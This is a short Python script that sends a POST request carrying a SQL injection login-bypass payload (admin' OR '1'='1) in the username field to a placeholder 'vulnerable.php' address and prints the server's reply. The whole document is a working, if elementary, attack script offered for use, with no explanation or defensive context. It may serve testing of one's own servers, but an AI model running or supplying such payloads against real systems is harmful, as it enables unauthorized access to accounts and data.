import requests

# Target vulnerable PHP page URL
target_url = 'http://your_server_ip_or_hostname/vulnerable.php'

# User input with SQL injection payload
username = "admin' OR '1'='1"

# Payload for the POST request
payload = {
    'username': username
}

try:
    # Send POST request
    response = requests.post(target_url, data=payload)

    # Print response
    print(response.text)
except requests.exceptions.RequestException as e:
    print(f"An error occurred: {e}")
